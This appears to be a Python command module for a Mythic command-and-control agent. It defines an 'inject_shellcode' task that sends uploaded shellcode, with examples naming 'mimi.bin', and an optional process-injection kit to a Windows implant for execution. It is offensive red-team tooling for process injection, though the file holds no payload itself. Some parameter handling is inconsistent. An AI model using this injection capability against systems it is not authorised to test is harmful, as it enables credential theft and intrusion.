from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from ..utils.packer import serialize_int, serialize_bool, serialize_string
import logging, sys
import os
import tempfile
import donut
from .utils.agent_global_settings import PROCESS_INJECT_KIT

'''
    [BRIEF]
    
    This command is not designed to be used directly although it can be.
    It takes an already uploaded PIC shellcode file as an input and sends a UUID string as 
    an argument to the Agent.
    
    [Input]: 
        - File
    [Output]:
        - {str} File UUID
        - {typedlist} [bytes:kit_spawn_contents] Raw file of the currently configured Process Injection Kit BOF 
'''

logging.basicConfig(level=logging.INFO)

class InjectShellcodeArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            # This is designed to be passed from other commands with MythicRPCTaskCreateSubtaskMessage
            CommandParameter(
                name="shellcode_file",
                cli_name="File",
                display_name="Shellcode File",
                type=ParameterType.File,
                description="A shellcode file uploaded to Mythic.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, 
                        group_name="Existing", 
                        ui_position=1,
                    )
                ]
            ),
            CommandParameter(
                name="method",
                cli_name="-method",
                display_name="Inject Method",
                type=ParameterType.ChooseOne,
                default_value="default",
                choices=[
                    "default",
                    "custom"
                ],
                description="Process injection method used to execute the shellcode. (e.g., default|custom)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, 
                        group_name="Existing", 
                        ui_position=2,
                    )
                ]
            ),
            # This will be set Globally, so dont make it an option
            # CommandParameter(
            #     name="process_inject_kit_file",
            #     cli_name="-kit",
            #     display_name="Injection Kit",
            #     type=ParameterType.File,
            #     description="Custom Process Inject Kit BOF file. This gets passed as a Mythic File UUID",
            #     parameter_group_info=[
            #         ParameterGroupInfo(
            #             required=False,
            #             group_name="Existing", 
            #             ui_position=3,
            #         )
            #     ]
            # ),
            
            # CommandParameter(
            #     name="shellcode_name",
            #     cli_name="File",
            #     display_name="File",
            #     type=ParameterType.ChooseOne,
            #     dynamic_query_function=self.get_files,
            #     description="Already existing PIC Shellcode to execute (e.g. mimi.bin)",
            #     parameter_group_info=[
            #         ParameterGroupInfo(
            #             required=True,
            #             group_name="Existing",
            #             ui_position=1
            #         )
            #     ]),
            # CommandParameter(
            #     name="shellcode_file",
            #     cli_name="File",
            #     display_name="New File",
            #     type=ParameterType.File,
            #     description="A new PIC shellcode to execute. After uploading once, you can just supply the -File parameter",
            #     parameter_group_info=[
            #         ParameterGroupInfo(
            #             required=True, 
            #             group_name="New File", 
            #             ui_position=1,
            #         )
            #     ]
            # )            
        ]
    
    async def get_files(self, callback: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        response = PTRPCDynamicQueryFunctionMessageResponse()
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=callback.Callback,
            LimitByCallback=False,
            Filename="",
        ))
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".bin"):
                    file_names.append(f.Filename)
            response.Success = True
            response.Choices = file_names
            return response
        else:
            await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                CallbackId=callback.Callback,
                Message=f"Failed to get files: {file_resp.Error}",
                MessageLevel="warning"
            ))
            response.Error = f"Failed to get files: {file_resp.Error}"
            return response


    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments given.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.")
        self.load_args_from_json_string(self.command_line)
        pass
        
class InjectShellcodeCommand(CommandBase):
    cmd = "inject_shellcode"
    needs_admin = False
    help_cmd = "inject_shellcode -File [mimi.bin] --method [default|custom] --kit [file.o]"
    description = "Execute PIC shellcode. (e.g., inject_shellcode -File mimi.bin --method default --kit inject_spawn.x64.o"
    version = 1
    author = "@c0rnbread"
    attackmapping = []
    argument_class = InjectShellcodeArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[ SupportedOS.Windows ],
        suggested_command=False
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        try:
            ######################################
            #                                    #
            #   Group (New File | Existing)      #
            #                                    #
            ######################################
            groupName = taskData.args.get_parameter_group_name()
            method = taskData.args.get_arg("method")
            
            # if groupName == "New File":
            #     file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            #         TaskID=taskData.Task.ID,
            #         AgentFileID=taskData.args.get_arg("shellcode_file")
            #     ))
                
            #     if file_resp.Success:
            #         original_file_name = file_resp.Files[0].Filename
            #     else:
            #         raise Exception("Failed to fetch uploaded file from Mythic (ID: {})".format(taskData.args.get_arg("shellcode_file")))
                
            #     taskData.args.add_arg("shellcode_file", file_resp.Files[0].AgentFileId, parameter_group_info=[ParameterGroupInfo(
            #         group_name="New File"
            #     )])
            #     # When this is here the filename is properly set in Mythic, BUT agent parses filename as UUID and fails.
            #     taskData.args.add_arg("shellcode_name", original_file_name, parameter_group_info=[ParameterGroupInfo(
            #         group_name="New File"
            #         )])
                
                
            #     # taskData.args.add_arg("file_id", taskData.args.get_arg("shellcode_file"), parameter_group_info=[ParameterGroupInfo(
            #     #     group_name="New File"
            #     #     )])

            #     response.DisplayParams = original_file_name

            #elif groupName == "Existing":
            if groupName == "Existing":
                # Retrieve the shellcode file to inject
                file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    TaskID=taskData.Task.ID,
                    Filename=taskData.args.get_arg("shellcode_name"),
                    LimitByCallback=False,
                    MaxResults=1
                ))
                if not file_resp.Success:
                    raise Exception("Failed to fetch find file from Mythic (name: {})".format(taskData.args.get_arg("shellcode_name")))
                taskData.args.add_arg("shellcode_file", file_resp.Files[0].AgentFileId, parameter_group_info=[ParameterGroupInfo(
                    group_name="Existing"
                )])
                
                taskData.args.remove_arg("shellcode_name")      # Don't need to send this to Agent
                taskData.args.remove_arg("method")              # Don't need to send this to Agent

                # Handle custom process injection kit option
                if method == "custom":
                    kit_spawn_uuid = PROCESS_INJECT_KIT.get_inject_spawn()
                    if not kit_spawn_uuid:
                        raise Exception("Failed to get UUID for Process Injection Kit. Have you run register_process_injection_kit yet??")
                    # Send BOF contents to Agent
                    kit_spawn_file = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=kit_spawn_uuid)
                    )
                    if not kit_spawn_file.Success:
                        raise Exception("Failed to fetch find file from Mythic (UUID: {})".format(kit_spawn_uuid))
                    
                    kit_spawn_contents = kit_spawn_file.Content
                    
                    #taskData.args.add_arg("kit_spawn_contents", kit_spawn_contents)
                    kit_typed_array = [["bytes", kit_spawn_contents.hex()]]         # I'm only doing this cause its easier for my translation container to pack raw bytes
                    taskData.args.add_arg("kit_spawn_contents", kit_typed_array, type=ParameterType.TypedArray, parameter_group_info=[ParameterGroupInfo(
                        group_name="Existing"
                    )])
                    
                    logging.info(f"\n[+] Using Custom Process Injection Kit. \n\t- PROCESS_INJECT_SPAWN:{kit_spawn_uuid}:{len(kit_spawn_contents)} bytes\n")
                    
                response.DisplayParams = "-File {} --method {}".format(
                    file_resp.Files[0].Filename,
                    taskData.args.get_arg("shellcode_name"),
                    taskData.args.get_arg("method"),
                    # taskData.args.get_arg("process_inject_kit_file")
                )
            
            # Debugging
            logging.info(taskData.args.to_json())
            
            return response

        except Exception as e:
            raise Exception("Error from Mythic: " + str(sys.exc_info()[-1].tb_lineno) + " : " + str(e))
        

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp